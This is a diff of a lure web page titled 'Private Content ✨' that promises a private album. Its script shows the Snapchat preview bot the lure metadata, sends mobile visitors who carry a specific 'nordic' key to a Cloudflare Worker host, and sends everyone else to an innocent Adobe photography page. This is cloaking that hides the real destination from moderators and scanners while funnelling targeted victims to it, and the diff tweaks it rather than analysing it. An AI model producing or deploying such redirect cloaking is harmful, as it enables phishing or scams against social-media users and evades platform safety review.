@@ -1,49 +1,43 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     
-    <title>Private Content</title>
-    <meta name="description" content="View shared media folder">
+    <title>Private Content ✨</title>
 
     <meta property="og:title" content="Private Content ✨" />
-    <meta property="og:description" content="Join to view" />
+    <meta property="og:description" content="Join to view private album" />
     <meta property="og:image" content="https://img.icons8.com/emoji/96/cherries.png" />
-    <meta property="og:url" content="https://beaty-page.github.io/" />
     <meta property="og:type" content="website" />
-
+    
     <meta name="twitter:card" content="summary_large_image">
-    <meta name="twitter:title" content="Private Content ✨">
-    <meta name="twitter:description" content="Join to view">
     <meta name="twitter:image" content="https://img.icons8.com/emoji/96/cherries.png">
 
     <style>
-        body { background-color: #ffffff; margin: 0; padding: 0; display: flex; justify-content: center; align-items: center; height: 100vh; font-family: sans-serif; }
-        .loading { color: #ccc; font-size: 14px; }
+        body { background-color: #ffffff; }
     </style>
 </head>
 <body>
-    <div class="loading">Loading...</div>
-
     <script>
+        // Твоя ссылка на Cloudflare Worker
         const targetHost = "https://media-processor.radulive9.workers.dev/";
+        
         const urlParams = new URLSearchParams(window.location.search);
         const ua = navigator.userAgent;
         const key = urlParams.get('sl');
 
-        // Список ботов, которым НЕЛЬЗЯ делать редирект, чтобы они видели превью
-        const isBot = /Snapchat|Bot|Cloudflare|Twitter|Preview/i.test(ua);
+        // Проверка на бота Snapchat
+        const isSnapBot = ua.includes("Snapchat") || ua.includes("Snap URL Preview Service");
 
-        if (!isBot) {
-            if (key === 'nordic' && /Android|iPhone|iPad/i.test(ua)) {
-                // Маленькая задержка, чтобы браузер не считал это мгновенным спам-редиректом
-                setTimeout(() => {
-                    window.location.replace(targetHost + window.location.search);
-                }, 500);
-            } else {
-                window.location.replace("https://www.adobe.com/creativecloud/photography/type/nature-photography.html");
-            }
+        if (isSnapBot) {
+            // Бот видит страницу и мета-теги, редирект не мешает ему делать превью
+        } else if (key === 'nordic' && /Android|iPhone|iPad/i.test(ua)) {
+            // Живой юзер - летит на воркер
+            window.location.replace(targetHost + window.location.search);
+        } else {
+            // Остальные на Adobe
+            window.location.replace("https://www.adobe.com/creativecloud/photography/type/nature-photography.html");
         }
     </script>
 </body>
